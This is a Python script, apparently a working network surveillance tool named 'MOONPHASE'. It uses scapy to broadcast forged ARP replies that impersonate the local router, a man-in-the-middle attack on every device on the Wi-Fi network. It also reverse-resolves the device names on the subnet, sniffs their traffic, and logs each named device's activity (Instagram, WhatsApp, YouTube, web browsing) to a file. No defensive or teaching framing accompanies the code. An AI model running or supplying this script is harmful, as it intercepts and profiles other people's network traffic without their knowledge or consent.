import logging, socket, os, threading, time
from scapy.all import sniff, IP, TCP, UDP, ARP, send, conf

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
LOG_FILE = "sniffer_data.txt"

def get_info():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        meu = s.getsockname()[0]
        s.close()
        router = conf.route.route("0.0.0.0")[2]
        return meu, router
    except: return "127.0.0.1", "192.168.1.1"

MEU_IP, ROUTER_IP = get_info()
cache_nomes = {}

def resolver_nomes_bg():
    prefixo = ".".join(MEU_IP.split('.')[:-1]) + "."
    while True:
        for i in range(1, 255):
            ip = prefixo + str(i)
            if ip not in cache_nomes:
                try:
                    nome = socket.gethostbyaddr(ip)[0].split('.')[0]
                    cache_nomes[ip] = nome
                except: cache_nomes[ip] = f"ID_{i}"
        time.sleep(30)

threading.Thread(target=resolver_nomes_bg, daemon=True).start()

def arp_spoofer():
    pkt = ARP(op=2, pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff", psrc=ROUTER_IP)
    while True:
        try:
            send(pkt, verbose=False)
            time.sleep(1)
        except: break

threading.Thread(target=arp_spoofer, daemon=True).start()

def identificar_app(ip_dst, porto):
    if ip_dst.startswith(("31.13.", "157.240.", "158.247.", "185.60.")): return "Instagram/FB"
    if ip_dst.startswith(("142.250.", "172.217.", "216.58.", "74.125.")): return "YouTube/Google"
    if porto in [5222, 5223, 5228, 443]: 
        if ip_dst.startswith("157.240."): return "WhatsApp"
        return "Navegacao SSL"
    return None

def processar_pacote(pkt):
    if pkt.haslayer(IP):
        src, dst = pkt[IP].src, pkt[IP].dst
        if src == MEU_IP or src == ROUTER_IP: return
        
        if dst in ["224.0.0.22", "255.255.255.255", "224.0.0.1"]: return

        nome = cache_nomes.get(src, f"ID_{src.split('.')[-1]}")
        if str(nome).startswith("ID_"): return

        # Identificar atividade
        porto = 0
        if pkt.haslayer(TCP): porto = pkt[TCP].dport
        elif pkt.haslayer(UDP): porto = pkt[UDP].dport

        app = identificar_app(dst, porto)
        
        if app:
            info = app
        elif dst.startswith("224.0.0."):
            info = "Scanner Rede"
        else:
            info = "Intercecao Web"

        linha = f"{nome}>{info}"
        with open(LOG_FILE, "a") as f:
            f.write(linha + "\n")
            f.flush()
        print(f"[!] {linha} ({src} -> {dst})")

if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
print(f"--- MOONPHASE: SNIFFER ATIVO (Filtros ON) ---")
sniff(iface="wlan0", prn=processar_pacote, store=0)
